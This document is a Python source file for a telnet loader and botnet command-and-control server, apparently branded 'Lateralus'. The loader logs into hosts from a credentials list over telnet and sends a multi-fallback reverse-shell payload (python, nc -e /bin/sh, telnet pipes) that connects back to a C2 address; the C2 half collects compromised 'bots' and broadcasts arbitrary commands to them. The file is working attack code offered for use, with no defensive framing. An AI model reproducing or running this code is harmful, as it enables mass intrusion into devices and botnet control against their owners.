#!/usr/bin/env python3
# Lateralus Loader + C2 | Telnet Loader
# Usage: python3 main.py [loader|c2] ...

import sys
import socket
import time
import threading

# ================= CONFIG =================
DEFAULT_C2_PORT = 4444
BANNER = r"""
░██                       ░██                                   ░██
░██                       ░██                                   ░██
░██          ░██████   ░████████  ░███████  ░██░████  ░██████   ░██ ░██    ░██  ░███████
░██               ░██     ░██    ░██    ░██ ░███           ░██  ░██ ░██    ░██ ░██
░██          ░███████     ░██    ░█████████ ░██       ░███████  ░██ ░██    ░██  ░███████
░██         ░██   ░██     ░██    ░██        ░██      ░██   ░██  ░██ ░██   ░███        ░██
░██████████  ░█████░██     ░████  ░███████  ░██       ░█████░██ ░██  ░█████░██  ░███████

░██                                      ░██                                     ░██         ░████
░██                                      ░██                                   ░████        ░██ ░██
░██          ░███████   ░██████    ░████████  ░███████  ░██░████    ░██    ░██   ░██       ░██ ░████
░██         ░██    ░██       ░██  ░██    ░██ ░██    ░██ ░███        ░██    ░██   ░██       ░██░██░██
░██         ░██    ░██  ░███████  ░██    ░██ ░█████████ ░██          ░██  ░██    ░██       ░████ ░██
░██         ░██    ░██ ░██   ░██  ░██   ░███ ░██        ░██           ░██░██     ░██        ░██ ░██
░██████████  ░███████   ░█████░██  ░█████░██  ░███████  ░██            ░███    ░██████ ░██   ░████
                                     https://lateralus.dev/
"""
# ==========================================

# ---------- Reverse Shell Payload ----------
def make_payload(ip, port):
    """Generate robust reverse shell payload (python3, python2, nc, telnet)."""
    return f'''(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);' 2>/dev/null || python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);' 2>/dev/null || nc {ip} {port} -e /bin/sh 2>/dev/null || (telnet {ip} {port} | /bin/sh | telnet {ip} {port+1}) &) &'''

# ==========================================
#  LOADER PART
# ==========================================
def read_until(sock, needle, timeout=8):
    buf = b''
    needle = needle.encode() if isinstance(needle, str) else needle
    start = time.time()
    while time.time() - start < timeout:
        try:
            data = sock.recv(1024)
            if not data:
                break
            buf += data
            if needle in buf:
                return buf
            time.sleep(0.01)
        except:
            break
    raise Exception("Timeout")

def sqwad(ip, username, password, c2_ip, c2_port):
    ip = ip.strip()
    username = username.strip()
    password = password.strip()
    tn = None
    try:
        tn = socket.socket()
        tn.settimeout(5)
        tn.connect((ip, 23))
    except:
        print(f"\033[32m[\033[31m+\033[32m] \033[31mFailed to connect to port 23\033[37m {ip}")
        if tn:
            tn.close()
        return

    # Send username
    try:
        read_until(tn, "ogin")
        tn.send((username + "\n").encode())
        print(f"\033[32m[\033[31m+\033[32m] \033[35mSending Username\033[37m {ip}")
        time.sleep(0.09)
    except:
        tn.close()
        return

    # Send password
    try:
        read_until(tn, "assword:")
        tn.send((password + "\n").encode())
        print(f"\033[32m[\033[33m+\033[32m] \033[36mSending Password\033[37m {ip}")
        time.sleep(2)
    except:
        tn.close()
        return

    # Send command (reverse shell)
    cmd = make_payload(c2_ip, c2_port)
    try:
        tn.send(b"sh\n")
        time.sleep(0.009)
        tn.send(b"shell\n")
        time.sleep(0.01)
        tn.send((cmd + "\n").encode())
        print(f"\033[32m[\033[31m+\033[32m] \033[32mPayload sent\033[37m {ip}")
        time.sleep(15)
        tn.close()
    except:
        tn.close()

def loader_mode(target_file, c2_ip, c2_port):
    """Run the telnet loader."""
    print(BANNER)
    print("[*] Sleep's Loader deployed – sending reverse shells")
    try:
        with open(target_file, 'r') as f:
            lines = f.readlines()
    except Exception as e:
        sys.exit(f"Error reading file: {e}")

    print(f"[*] Target list: {target_file} → C2 at {c2_ip}:{c2_port}\n")
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split(':')
        if len(parts) >= 3:
            ip, user, passwd = parts[0], parts[1], parts[2]
            threading.Thread(target=sqwad, args=(ip, user, passwd, c2_ip, c2_port)).start()
            time.sleep(0.01)

# ==========================================
#  C2 SERVER PART
# ==========================================
clients = {}
client_addrs = {}
lock = threading.Lock()
next_id = 1

def handle_client(conn, addr, bot_id):
    print(f"\n[+] Bot {bot_id} connected from {addr[0]}:{addr[1]}")
    conn.send(b"[+] Connected to Sleep's C2\n")
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            sys.stdout.write(f"\n[Bot {bot_id}] {data.decode('utf-8', errors='ignore')}")
            sys.stdout.write("\n> ")
            sys.stdout.flush()
        except:
            break
    with lock:
        if bot_id in clients:
            del clients[bot_id]
            del client_addrs[bot_id]
    conn.close()
    print(f"\n[-] Bot {bot_id} disconnected ({addr[0]})")
    print("> ", end="", flush=True)

def broadcast(cmd):
    with lock:
        if not clients:
            print("[!] No bots connected.")
            return
        for bot_id, conn in clients.items():
            try:
                conn.send((cmd + "\n").encode())
            except:
                pass

def send_to(bot_id, cmd):
    with lock:
        if bot_id not in clients:
            print(f"[!] Bot {bot_id} not found.")
            return
        try:
            clients[bot_id].send((cmd + "\n").encode())
        except:
            print(f"[!] Bot {bot_id} unreachable.")

def list_bots():
    with lock:
        if not clients:
            print("[!] No bots connected.")
        else:
            print("\nConnected bots:")
            for bot_id, conn in clients.items():
                addr = client_addrs.get(bot_id, "unknown")
                print(f"  {bot_id} -> {addr}")
    print("> ", end="", flush=True)

def c2_mode(listen_port):
    """Run the C2 server."""
    print(BANNER)
    print("[*] Sleep's Command & Control Center")
    global next_id
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", listen_port))
    except Exception as e:
        sys.exit(f"Failed to bind to port {listen_port}: {e}")
    server.listen(5)
    print(f"[*] C2 listening on 0.0.0.0:{listen_port}")
    print("Type 'help' for commands.\n")

    def accept_loop():
        global next_id
        while True:
            conn, addr = server.accept()
            with lock:
                bot_id = next_id
                next_id += 1
                clients[bot_id] = conn
                client_addrs[bot_id] = addr
            threading.Thread(target=handle_client, args=(conn, addr, bot_id), daemon=True).start()

    threading.Thread(target=accept_loop, daemon=True).start()

    # Main command loop
    while True:
        try:
            cmd_line = input("> ").strip()
            if not cmd_line:
                continue
            if cmd_line == "help":
                print("""
Commands:
  list                      - show connected bots
  broadcast <command>       - send command to all bots
  send <bot_id> <command>   - send command to specific bot
  exit                      - stop server
""")
            elif cmd_line == "list":
                list_bots()
            elif cmd_line.startswith("broadcast "):
                broadcast(cmd_line[10:])
            elif cmd_line.startswith("send "):
                parts = cmd_line.split(maxsplit=2)
                if len(parts) < 3:
                    print("[!] Usage: send <bot_id> <command>")
                else:
                    try:
                        bot_id = int(parts[1])
                        send_to(bot_id, parts[2])
                    except ValueError:
                        print("[!] Bot ID must be a number.")
            elif cmd_line == "exit":
                print("[*] Shutting down...")
                for conn in clients.values():
                    conn.close()
                server.close()
                sys.exit(0)
            else:
                print("[!] Unknown command. Try 'help'.")
        except (KeyboardInterrupt, EOFError):
            print("\n[!] Exiting...")
            for conn in clients.values():
                conn.close()
            server.close()
            sys.exit(0)

# ==========================================
#  MAIN
# ==========================================
def show_help():
    print(f"""
{BANNER}
Usage:
  Loader mode:  python3 {sys.argv[0]} loader <targets.txt> [--c2-ip IP] [--c2-port PORT]
  C2 mode:      python3 {sys.argv[0]} c2 [PORT]

Options:
  -h, --help    Show this help message

Examples:
  python3 {sys.argv[0]} loader telnet.txt --c2-ip 127.0.0.1 --c2-port 4444
  python3 {sys.argv[0]} c2 4444
""")

if __name__ == "__main__":
    # Check for help flags
    if len(sys.argv) > 1 and sys.argv[1] in ("-h", "--help"):
        show_help()
        sys.exit(0)

    if len(sys.argv) < 2:
        show_help()
        sys.exit(1)

    mode = sys.argv[1].lower()

    if mode == "loader":
        if len(sys.argv) < 3:
            print("[!] Missing target file")
            show_help()
            sys.exit(1)
        target_file = sys.argv[2]
        c2_ip = "127.0.0.1"
        c2_port = DEFAULT_C2_PORT
        # Parse optional --c2-ip and --c2-port
        i = 3
        while i < len(sys.argv):
            if sys.argv[i] == "--c2-ip" and i+1 < len(sys.argv):
                c2_ip = sys.argv[i+1]
                i += 2
            elif sys.argv[i] == "--c2-port" and i+1 < len(sys.argv):
                try:
                    c2_port = int(sys.argv[i+1])
                except:
                    pass
                i += 2
            else:
                i += 1
        loader_mode(target_file, c2_ip, c2_port)

    elif mode == "c2":
        port = DEFAULT_C2_PORT
        if len(sys.argv) >= 3:
            try:
                port = int(sys.argv[2])
            except:
                pass
        c2_mode(port)

    else:
        show_help()
        sys.exit(1)
